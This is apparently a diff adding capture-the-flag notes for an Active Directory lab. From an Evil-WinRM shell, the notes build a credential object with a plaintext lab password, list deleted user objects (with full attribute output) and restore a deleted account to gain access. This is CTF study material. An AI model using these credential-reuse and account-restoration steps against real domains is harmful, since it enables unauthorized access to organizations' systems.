@@ -143,3 +143,71 @@ Restore AD User:
 ```bash
 *Evil-WinRM* PS C:\windows\tasks> Restore-ADObject -Identity "CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb" -TargetPath "OU=ADCS,DC=tombwatcher,DC=htb"
 ```
+
+
+From another user:
+```bash
+$cred = [PSCredential]::new("svc_ldap@voleur.htb", (ConvertTo-SecureString "M1XyC9pW7qT5Vn" -AsPlainText -Force))
+```
+
+
+Enumerate:
+
+```bash
+*Evil-WinRM* PS C:\Users\svc_winrm\Documents> Get-ADObject -IncludeDeletedObjects -Filter 'IsDeleted -eq $true -and ObjectClass -eq "user"' -Properties * -Credential $cred
+
+
+accountExpires                  : 9223372036854775807
+badPasswordTime                 : 0
+badPwdCount                     : 0
+CanonicalName                   : voleur.htb/Deleted Objects/Todd Wolfe
+                                  DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
+CN                              : Todd Wolfe
+                                  DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
+codePage                        : 0
+countryCode                     : 0
+Created                         : 1/29/2025 1:08:06 AM
+createTimeStamp                 : 1/29/2025 1:08:06 AM
+Deleted                         : True
+Description                     : Second-Line Support Technician
+DisplayName                     : Todd Wolfe
+DistinguishedName               : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
+dSCorePropagationData           : {5/13/2025 4:11:10 PM, 1/29/2025 4:52:29 AM, 1/29/2025 4:49:29 AM, 1/29/2025 1:08:06 AM...}
+givenName                       : Todd
+instanceType                    : 4
+isDeleted                       : True
+LastKnownParent                 : OU=Second-Line Support Technicians,DC=voleur,DC=htb
+lastLogoff                      : 0
+lastLogon                       : 133826301603754403
+lastLogonTimestamp              : 133826287869758230
+logonCount                      : 3
+memberOf                        : {CN=Second-Line Technicians,DC=voleur,DC=htb, CN=Remote Management Users,CN=Builtin,DC=voleur,DC=htb}
+Modified                        : 5/13/2025 4:11:17 PM
+modifyTimeStamp                 : 5/13/2025 4:11:17 PM
+msDS-LastKnownRDN               : Todd Wolfe
+Name                            : Todd Wolfe
+                                  DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
+nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  :
+ObjectClass                     : user
+ObjectGUID                      : 1c6b1deb-c372-4cbb-87b1-15031de169db
+objectSid                       : S-1-5-21-3927696377-1337352550-2781715495-1110
+primaryGroupID                  : 513
+ProtectedFromAccidentalDeletion : False
+pwdLastSet                      : 133826280731790960
+sAMAccountName                  : todd.wolfe
+sDRightsEffective               : 0
+sn                              : Wolfe
+userAccountControl              : 66048
+userPrincipalName               : todd.wolfe@voleur.htb
+uSNChanged                      : 45088
+uSNCreated                      : 12863
+whenChanged                     : 5/13/2025 4:11:17 PM
+whenCreated                     : 1/29/2025 1:08:06 AM
+```
+
+Restore: 
+
+```bash
+Restore-ADObject -Identity "CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb" -TargetPath "OU=Second-Line Support Technicians,DC=voleur,DC=htb" -Credential $cred
+```
